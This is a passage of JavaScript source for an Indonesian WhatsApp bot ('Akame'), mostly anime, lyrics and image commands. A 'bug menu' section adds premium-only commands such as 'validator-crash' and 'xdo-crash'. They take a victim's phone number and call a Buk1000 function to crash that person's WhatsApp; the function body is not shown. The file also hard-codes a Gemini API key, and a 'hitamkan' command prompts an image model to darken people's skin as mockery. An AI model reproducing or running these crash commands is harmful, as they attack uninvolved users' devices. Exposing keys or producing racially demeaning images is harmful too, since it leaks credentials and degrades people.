        let responseText = `*📺 Hasil Pencarian Anime: ${text}*\n\n`;
        for (let anime of results) {
            responseText += `🎞️ *Judul:* ${anime.title}\n`;
            responseText += `⭐ *Rating:* ${anime.rating}\n`;
            responseText += `📌 *Tipe:* ${anime.type}\n`;
            responseText += `🔗 *Link:* [Klik Disini](${anime.anime_url})\n\n`;
        }

        await Kyyhst.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });

        await Kyyhst.sendMessage(m.chat, {
            text: responseText,
            contextInfo: { externalAdReply: {
                title: results[0].title,
                body: "Klik untuk menonton anime",
                thumbnailUrl: results[0].poster,
                sourceUrl: results[0].anime_url,
                mediaType: 1
            }}
        }, { quoted: m });

    } catch (error) {
        console.error('❌ Error:', error);
        return m.reply('❌ Terjadi kesalahan saat mengambil data anime.');
    }
}
break;
 case 'owner': {
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp; KyyXD\nORG: Kyy\nTITLE:soft\nitem1.TEL;waid=6288286624778:6288286624778\nitem1.X-ABLabel:Ponsel\nitem2.URL:https://www.youtube.com/@KyyHost\nitem2.X-ABLabel:ðŸ’¬ More\nitem3.EMAIL;type=INTERNET: kyyftcs@gmail.com\nitem3.X-ABLabel:Email\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABADR:ðŸ’¬ More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;
const sentMsg = await Kyyhst.sendMessage(m.chat, {
      contacts: {
        displayName: author,
        contacts: [{ vcard }],
      },
      contextInfo: {
        externalAdReply: {
          title: "M Y  O W N E R - K Y Y",
          body: "JANGAN SPAM",
          thumbnailUrl: `https://img12.pixhost.to/images/1030/577695087_kyyxd.jpg`,
          mediaType: 1,
          showAdAttribution: false,
          renderLargerThumbnail: true,
        }}}, { quoted: m });
}
break
case 'sc':
            case 'script':
            case 'scbot':
function _0x865b(_0x1b8faf,_0xe9f36a){var _0x53e59f=_0x53e5();return _0x865b=function(_0x865ba1,_0x2cbe58){_0x865ba1=_0x865ba1-0x1df;var _0x1d2333=_0x53e59f[_0x865ba1];return _0x1d2333;},_0x865b(_0x1b8faf,_0xe9f36a);}var _0x27d539=_0x865b;(function(_0x3eca85,_0x59d7ac){var _0x2afacd=_0x865b,_0x45149b=_0x3eca85();while(!![]){try{var _0x2b833e=parseInt(_0x2afacd(0x1e7))/0x1+parseInt(_0x2afacd(0x1e5))/0x2+-parseInt(_0x2afacd(0x1df))/0x3*(parseInt(_0x2afacd(0x1e3))/0x4)+parseInt(_0x2afacd(0x1e9))/0x5*(parseInt(_0x2afacd(0x1ea))/0x6)+-parseInt(_0x2afacd(0x1ee))/0x7+-parseInt(_0x2afacd(0x1e2))/0x8*(parseInt(_0x2afacd(0x1ed))/0x9)+-parseInt(_0x2afacd(0x1e4))/0xa*(-parseInt(_0x2afacd(0x1e0))/0xb);if(_0x2b833e===_0x59d7ac)break;else _0x45149b['push'](_0x45149b['shift']());}catch(_0x33e380){_0x45149b['push'](_0x45149b['shift']());}}}(_0x53e5,0x98a1c),await Kyyhst[_0x27d539(0x1e6)](m[_0x27d539(0x1eb)],{'react':{'text':_0x27d539(0x1e1),'key':m[_0x27d539(0x1ec)]}}),reply(_0x27d539(0x1ef)+pushname+_0x27d539(0x1e8)));function _0x53e5(){var _0x4d42c9=['45mOmTxw','143FwHGIs','😶‍🌫','9425936frhrzN','281948ChlvZC','1177290TPDuhS','4070ziTHES','sendMessage','198447jEawxE','\x0a\x0aUntuk\x20Script\x20Akame\x20Itu\x20Free\x20Ya\x20Ada\x20Di\x20Saluran\x20:https://whatsapp.com/channel/0029Vb7gTNO5a2450z5MnD0k\x0aJika\x20Ada\x20Yang\x20Jual\x20Gaush\x20Beli\x20Ya\x20Tinggal\x20Join\x20Ch\x20Di\x20Atas','31640yTxWUd','1164pFrQFY','chat','key','9HSZYMs','685048sjXldd','Halo\x20Kak\x20'];_0x53e5=function(){return _0x4d42c9;};return _0x53e5();}
break
case "nulis": case "tulis": {
  if (!text) return m.reply('❌ Masukkan teks yang ingin ditulis.\n\nExample: nulis Kyyhst Tamvan');
  
  m.reply(mess.wait);
  const axios = require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/nulis?text=${encodeURIComponent(text)}`;

  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    Kyyhst.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `📝 *Hasil TuKyyhstn* 📝\n\n📌 *Teks:* ${text}`
    }, { quoted: m });
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error\nLogs error : ${error.message}`);
  }
}
break
case 'assalamualaikum': 
case 'assalamualaikum wr. wb.': 
case 'assalamualaikum wr wb':
await Kyyhst.sendMessage(m.chat, {audio: fs.readFileSync('./system/suara/walaikumsalam.mp3'), viewOnce: false, mimetype:'audio/mpeg', ptt: true}, {quoted: m})
break
case "test": 
case "bot": 
case "p": 
case "P":
case "halo":
case "hai":
case "mana": 
case "oy":
case "oyy": 
await Kyyhst.sendMessage(m.chat, {audio: fs.readFileSync('./system/suara/adaapa1.mp3'), viewOnce: false, mimetype:'audio/mpeg', ptt: true}, {quoted: m})
break
case 'jkt48live': {
    try {
        let res = await fetch('https://michelleapi.vercel.app/jkt48/live')
        if (!res.ok) throw new Error('Error bg')
        
        let json = await res.json();
        if (!json.status || !json.data || !json.data.result.length) {
            return Kyyhst.sendMessage(m.chat, { text: 'Gaada yang live sekarang' }, { quoted: m })
        }

        let live = json.data.result[0]; 
        let caption = `*MEMBER JKT48 LIVE*\n\n` +
                      `👤 *Nama:* ${live.name}\n` +
                      `📡 *Tipe:* ${live.type}\n` +
                      `🎬 *Link streaming:* ${live.streaming_url_list[0].url}\n` +
                      `📅 *Mulai:* ${new Date(live.started_at).toLocaleString('id-ID')}\n`;

        let message = {
            image: { url: live.img },
            caption: caption,
        };

        Kyyhst.sendMessage(m.chat, message, { quoted: m })

    } catch (e) {
        console.error(e)
        Kyyhst.sendMessage(m.chat, { text: 'Terjadi kesalahan, coba lagi nanti 😀' }, { quoted: m })
    }
}
break
case 'rangkumyt': {
if (!text) return m.reply(`Gunakan: ${prefix}rangkumyt <url YouTube>`)
reply(mess.wait)
const translate = require('translate-google-api')
async function translateText(text, lang = "id") {
    try {
        let res = await translate(text, { to: lang });
        return Array.isArray(res) ? res.join("\n") : res;
    } catch (err) {
        console.error("Error dalam terjemahan:", err);
        return "Terjadi kesalahan saat menerjemahkan.";
    }
}
try {
        let url = text.trim();
        let response = await fetch(`https://fastrestapis.fasturl.cloud/aiexperience/ytpoint?url=${url}`);
        let json = await response.json();

        if (!json || json.status !== 200 || !json.result) {
            return m.reply("Gagal mengambil rangkuman.");
        }

        let { short_title, summary, keyPoints } = json.result;
        let translatedSummary = await translateText(summary, "id");
        let translatedKeyPoints = [];
        for (let key of keyPoints) {
            let translatedPoint = await translateText(key.point, "id");
            let translatedDetail = await translateText(key.summary, "id");
            translatedKeyPoints.push(`✅ *${translatedPoint}*\n${translatedDetail}`)
        }
        let caption = `📌 *${short_title}*\n\n📝 *Ringkasan Video:*\n${translatedSummary}\n\n📍 *Poin Utama:*\n${translatedKeyPoints.join("\n\n")}`
        m.reply(caption)
    } catch (err) {
        console.error("Error di rangkumyt:", err)
        m.reply("Terjadi kesalahan saat mengambil atau menerjemahkan data.")
    }
 break;
}
case 'inforaya': case 'raya': case 'lebaran': {
let targetIdulFitri = new Date('Maret 31, 2025 00:00:00');
let targetIdulAdha = new Date('Juni 7, 2025 00:00:00');
let currentDate = new Date();
let remainingFitri = targetIdulFitri.getTime() - currentDate.getTime();
let daysFitri = Math.floor(remainingFitri / (1000 * 60 * 60 * 24));
let remainingAdha = targetIdulAdha.getTime() - currentDate.getTime();
let daysAdha = Math.floor(remainingAdha / (1000 * 60 * 60 * 24));
let countdownMessage = `*HITUNG MUNDUR HARI RAYA*\n\n` +
        `\`📆 Idul Fitri 2025:\`\n- 31 Maret 2025\n` +
        `- *${daysFitri} hari* lagi\n\n` +
        `\`📆 Idul Adha 2025:\`\n- 7 Juni 2025\n` +
        `- *${daysAdha} hari* lagi`
let img = 'https://a.top4top.io/p_3353o8ph81.jpg'
let name = m.sender
let fkonn = {
        key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(m.chat ? { remoteJid: '0@s.whatsapp.net' } : {})
        },
        message: {
            contactMessage: {
                displayName: `${await Kyyhst.getName(name)}`,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${name}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
            }
        }
    };
Kyyhst.sendMessage(m.chat, {
        text: countdownMessage,
        contextInfo: {
            externalAdReply: {
                title: `Info Hari Raya 2025`,
                thumbnailUrl: ``,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
};
break;
case "hitamkan": {
 if (!m.quoted) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
 const { GoogleGenerativeAI } = require ("@google/generative-ai");
 let mime = m.quoted.mimetype || "";
 let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

 if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);

 let promptText = text || defaultPrompt;
 m.reply("Otw Menghitam...");

 try {
 let imgData = await m.quoted.download();
 let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

 const base64Image = imgData.toString("base64");

 const contents = [
 { text: promptText },
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];

 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });

 const response = await model.generateContent(contents);

 let resultImage;
 let resultText = "";

 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }

 if (resultImage) {
 const tempPath = `./gemini_${Date.now()}.png`;
 fs.writeFileSync(tempPath, resultImage);

 await Kyyhst.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*berhasil menghitamkan*`
 }, { quoted: m });

 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch {}
 }, 30000);
 } else {
 m.reply("Gagal Menghitamkan.");
 }
 } catch (error) {
 console.error(error);
 m.reply(`Error: ${error.message}`);
 }
}
break
case "infoakame": {
reply(`> I N F O - A K A M E\n\nOwner: KyyXD\nNameBot: Akame\nCreatedOn: 16/3/25\nLinkCh: https://whatsapp.com/channel/0029Vb7gTNO5a2450z5MnD0k`) 
}
break
 case 'getlirik': {
if (!q) return m.reply("Lirik Lagu Apa?")
async function getLyrics(lagunya) {
const response = await axios.get(`https://www.archive-ui.biz.id/search/lirik?q=${encodeURIComponent (lagunya)}`)
Kyyhst.sendMessage(m.chat, { image: { url: response.data.result.thumb }, caption: `*[ HASIL SEARCH ]*\n\n- Title: ${response.data.result.title}\n- Album: ${response.data.result.album}\n- Lyrics: ${response.data.result.lyrics}` }, { quoted: m })
}

getLyrics(q)
}
break


/* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/







//============================================================\\
    // 𝗕 𝗨 𝗚 𝗕𝗬 𝗞 𝗬 𝗬       -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'validator-crash': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'validator-ui': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'syatem-crash': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'system-ui': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'xdo-crash': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'xdo-ui': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "☠️", key: m.key}})
}
break

case 'xdo-system': {
if (!isPrem) return reply(`Khusus Premium User Akame`)
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`)
reply('𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭')
// Memulai Crashing
await Buk1000(target);
Kyyhst.sendMessage(from, {react: {text: "🀄", key: m.key}})
}
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    // M E T H O D E    -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'textunbanv1':
if (!isCreator) return reply(`Sok asik bangsat`);
const vaga = ` ${textunbanv1}`
reply(vaga)
break
case 'textunbanv2':
if (!isCreator) return reply(`Sok asik bangsat`);
const bandar = ` ${textunbanv2}`
reply(bandar)
break
case 'textunbanv3':
if (!isCreator) return reply(`Sok asik bangsat`);
const masokpakeok = ` ${textunbanv3}`
reply(masokpakeok)
break
case 'textunbanv4':
if (!isCreator) return reply(`Sok asik bangsat`);
const typo = ` ${textunbanv4}`
reply(typo)
break
case 'textunbanv5':
if (!isCreator) return reply(`Sok asik bangsat`);
const sokasim = ` ${textunbanv5}`
reply(sokasim)
break
case 'textunbanv6':
if (!isCreator) return reply(`Sok asik bangsat`);
const akakaka = ` ${textunbanv6}`
reply(akakaka)
break
case 'textunbanv7':
if (!isCreator) return reply(`Sok asik bangsat`);
const kopok = ` ${textunbanv7}`
reply(kopok)
break
case 'textunbanv8':
if (!isCreator) return reply(`Sok asik bangsat`);
const tehyung = ` ${textunbanv8}`
reply(tehyung)
break
case 'textunbanv9':
if (!isCreator) return reply(`Sok asik bangsat`);
const ahhyan = ` ${textunbanv9}`
reply(ahhyan)
break
case 'textunbanv10':
if (!isCreator) return reply(`Sok asik bangsat`);
const yamete = ` ${textunbanv10}`
reply(yamete)
break
case 'textunbanv11':
if (!isCreator) return reply(`Sok asik bangsat`);
const suuu = ` ${textunbanv11}`
reply(suuu)
break
case 'textunbanv12':
if (!isCreator) return reply(`Sok asik bangsat`);
const huuuu = ` ${textunbanv12}
huuu`
reply(huuuu)
break
case 'textunbanv13':
if (!isCreator) return reply(`Sok asik bangsat`);
const gaje = ` ${textunbanv13}`
reply(gaje)
break
case 'textunbanv14':
if (!isCreator) return reply(`Sok asik bangsat`);
const well = ` ${textunbanv14}`
reply(well)
break
case 'textunbanv15':
if (!isCreator) return reply(`Sok asik bangsat`);
const lempo = ` ${textunbanv15}`
reply(lempo)
break
case 'textunbanv16':
if (!isCreator) return reply(`Sok asik bangsat`);
const cok = ` ${textunbanv16}`
reply(cok)
break
case 'textunbanv17':
if (!isCreator) return reply(`Sok asik bangsat`);
const sayasuka = ` ${textunbanv17}`
reply(sayasuka)
break
case 'textunbanv18':
if (!isCreator) return reply(`Sok asik bangsat`);
const oooooooo= ` ${textunbanv18}`
reply(oooooooo)
break
case 'textunbanv19':
if (!isCreator) return reply(`Sok asik bangsat`);
const omaaavaaaaaaaa = ` ${textunbanv19}`
reply(omaaavaaaaaaaa)
break
case 'textunbanv20':
if (!isCreator) return reply(`Sok asik bangsat`);
const bykepo = ` ${textunbanv20}`
reply(bykepo)
break
case 'textunbanv21':
if (!isCreator) return reply(`Sok asik bangsat`);
const unbannned = ` ${textunbanv21}`
reply(unbannned)
break
case 'textunbanpremv1':
if (!isCreator) return reply(`Sok asik bangsat`);
const premi = ` ${textunbanpremv1}`
reply(premi)
break
case 'textunbanpremv2':
if (!isCreator) return reply(`Sok asik bangsat`);
const kelasss = ` ${textunbanpremv2}`
reply(kelasss)
break
case 'textunbanpremv3':
if (!isCreator) return reply(`Sok asik bangsat`);
const eek = ` ${textunbanpremv3}`
reply(eek)
break
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 METHODE 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/





//============================================================\\
    // A N I M E    -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'animeawoo':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
reply(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
Kyyhst.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
Kyyhst.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Kyyhst.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
